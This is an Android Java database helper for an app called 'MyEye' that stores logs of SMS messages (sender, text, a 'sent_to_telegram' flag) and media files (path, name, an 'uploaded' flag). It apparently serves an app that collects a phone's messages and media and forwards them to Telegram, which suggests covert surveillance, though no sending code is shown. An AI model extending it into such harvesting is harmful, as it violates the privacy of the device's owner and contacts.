package com.ahamedrahim.myeye;

import android.content.ContentValues;
import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.util.Log;
import java.util.ArrayList;
import java.util.List;

public class DatabaseHelper extends SQLiteOpenHelper {
    
    private static final String DATABASE_NAME = "MyEyeDB";
    private static final int DATABASE_VERSION = 1;
    
    // Table names
    private static final String TABLE_SMS = "sms_logs";
    private static final String TABLE_MEDIA = "media_logs";
    
    // SMS table columns
    private static final String KEY_SMS_ID = "id";
    private static final String KEY_SMS_SENDER = "sender";
    private static final String KEY_SMS_MESSAGE = "message";
    private static final String KEY_SMS_TIMESTAMP = "timestamp";
    private static final String KEY_SMS_SENT = "sent_to_telegram";
    
    // Media table columns
    private static final String KEY_MEDIA_ID = "id";
    private static final String KEY_MEDIA_PATH = "file_path";
    private static final String KEY_MEDIA_NAME = "file_name";
    private static final String KEY_MEDIA_SIZE = "file_size";
    private static final String KEY_MEDIA_TYPE = "file_type";
    private static final String KEY_MEDIA_TIMESTAMP = "timestamp";
    private static final String KEY_MEDIA_UPLOADED = "uploaded";
    
    // Create tables SQL
    private static final String CREATE_SMS_TABLE = "CREATE TABLE " + TABLE_SMS + "("
            + KEY_SMS_ID + " INTEGER PRIMARY KEY AUTOINCREMENT,"
            + KEY_SMS_SENDER + " TEXT,"
            + KEY_SMS_MESSAGE + " TEXT,"
            + KEY_SMS_TIMESTAMP + " TEXT,"
            + KEY_SMS_SENT + " INTEGER DEFAULT 0)";
    
    private static final String CREATE_MEDIA_TABLE = "CREATE TABLE " + TABLE_MEDIA + "("
            + KEY_MEDIA_ID + " INTEGER PRIMARY KEY AUTOINCREMENT,"
            + KEY_MEDIA_PATH + " TEXT,"
            + KEY_MEDIA_NAME + " TEXT,"
            + KEY_MEDIA_SIZE + " TEXT,"
            + KEY_MEDIA_TYPE + " TEXT,"
            + KEY_MEDIA_TIMESTAMP + " TEXT,"
            + KEY_MEDIA_UPLOADED + " INTEGER DEFAULT 0)";
    
    public DatabaseHelper(Context context) {
        super(context, DATABASE_NAME, null, DATABASE_VERSION);
    }
    
    @Override
    public void onCreate(SQLiteDatabase db) {
        db.execSQL(CREATE_SMS_TABLE);
        db.execSQL(CREATE_MEDIA_TABLE);
    }
    
    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion) {
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_SMS);
        db.execSQL("DROP TABLE IF EXISTS " + TABLE_MEDIA);
        onCreate(db);
    }
    
    // SMS Methods
    public void addSMS(String sender, String message, String timestamp) {
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues values = new ContentValues();
        
        values.put(KEY_SMS_SENDER, sender);
        values.put(KEY_SMS_MESSAGE, message);
        values.put(KEY_SMS_TIMESTAMP, timestamp);
        values.put(KEY_SMS_SENT, 1);
        
        db.insert(TABLE_SMS, null, values);
        db.close();
        
        Log.d("DatabaseHelper", "SMS added: " + sender);
    }
    
    public List<SMSLog> getAllSMS() {
        List<SMSLog> smsList = new ArrayList<>();
        String selectQuery = "SELECT * FROM " + TABLE_SMS + " ORDER BY " + KEY_SMS_ID + " DESC";
        
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.rawQuery(selectQuery, null);
        
        if (cursor.moveToFirst()) {
            do {
                SMSLog sms = new SMSLog();
                sms.setId(cursor.getInt(0));
                sms.setSender(cursor.getString(1));
                sms.setMessage(cursor.getString(2));
                sms.setTimestamp(cursor.getString(3));
                sms.setSent(cursor.getInt(4) == 1);
                smsList.add(sms);
            } while (cursor.moveToNext());
        }
        
        cursor.close();
        db.close();
        return smsList;
    }
    
    public int getSMSCount() {
        String countQuery = "SELECT * FROM " + TABLE_SMS;
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.rawQuery(countQuery, null);
        int count = cursor.getCount();
        cursor.close();
        return count;
    }
    
    // Media Methods
    public void addMedia(String filePath, String fileName, String fileSize, String fileType, String timestamp) {
        SQLiteDatabase db = this.getWritableDatabase();
        ContentValues values = new ContentValues();
        
        values.put(KEY_MEDIA_PATH, filePath);
        values.put(KEY_MEDIA_NAME, fileName);
        values.put(KEY_MEDIA_SIZE, fileSize);
        values.put(KEY_MEDIA_TYPE, fileType);
        values.put(KEY_MEDIA_TIMESTAMP, timestamp);
        values.put(KEY_MEDIA_UPLOADED, 1);
        
        db.insert(TABLE_MEDIA, null, values);
        db.close();
    }
    
    public List<MediaFile> getAllMedia() {
        List<MediaFile> mediaList = new ArrayList<>();
        String selectQuery = "SELECT * FROM " + TABLE_MEDIA + " ORDER BY " + KEY_MEDIA_ID + " DESC";
        
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.rawQuery(selectQuery, null);
        
        if (cursor.moveToFirst()) {
            do {
                MediaFile media = new MediaFile();
                media.setId(cursor.getInt(0));
                media.setFilePath(cursor.getString(1));
                media.setFileName(cursor.getString(2));
                media.setFileSize(cursor.getString(3));
                media.setFileType(cursor.getString(4));
                media.setTimestamp(cursor.getString(5));
                media.setUploaded(cursor.getInt(6) == 1);
                mediaList.add(media);
            } while (cursor.moveToNext());
        }
        
        cursor.close();
        db.close();
        return mediaList;
    }
    
    public int getMediaCount() {
        String countQuery = "SELECT * FROM " + TABLE_MEDIA;
        SQLiteDatabase db = this.getReadableDatabase();
        Cursor cursor = db.rawQuery(countQuery, null);
        int count = cursor.getCount();
        cursor.close();
        return count;
    }
    
    // Clear all data
    public void clearAllData() {
        SQLiteDatabase db = this.getWritableDatabase();
        db.delete(TABLE_SMS, null, null);
        db.delete(TABLE_MEDIA, null, null);
        db.close();
        Log.d("DatabaseHelper", "All data cleared");
    }
    
    // Data classes
    public static class SMSLog {
        private int id;
        private String sender;
        private String message;
        private String timestamp;
        private boolean sent;
        
        public int getId() { return id; }
        public void setId(int id) { this.id = id; }
        public String getSender() { return sender; }
        public void setSender(String sender) { this.sender = sender; }
        public String getMessage() { return message; }
        public void setMessage(String message) { this.message = message; }
        public String getTimestamp() { return timestamp; }
        public void setTimestamp(String timestamp) { this.timestamp = timestamp; }
        public boolean isSent() { return sent; }
        public void setSent(boolean sent) { this.sent = sent; }
    }
    
    public static class MediaFile {
        private int id;
        private String filePath;
        private String fileName;
        private String fileSize;
        private String fileType;
        private String timestamp;
        private boolean uploaded;
        
        public int getId() { return id; }
        public void setId(int id) { this.id = id; }
        public String getFilePath() { return filePath; }
        public void setFilePath(String filePath) { this.filePath = filePath; }
        public String getFileName() { return fileName; }
        public void setFileName(String fileName) { this.fileName = fileName; }
        public String getFileSize() { return fileSize; }
        public void setFileSize(String fileSize) { this.fileSize = fileSize; }
        public String getFileType() { return fileType; }
        public void setFileType(String fileType) { this.fileType = fileType; }
        public String getTimestamp() { return timestamp; }
        public void setTimestamp(String timestamp) { this.timestamp = timestamp; }
        public boolean isUploaded() { return uploaded; }
        public void setUploaded(boolean uploaded) { this.uploaded = uploaded; }
    }
                  }
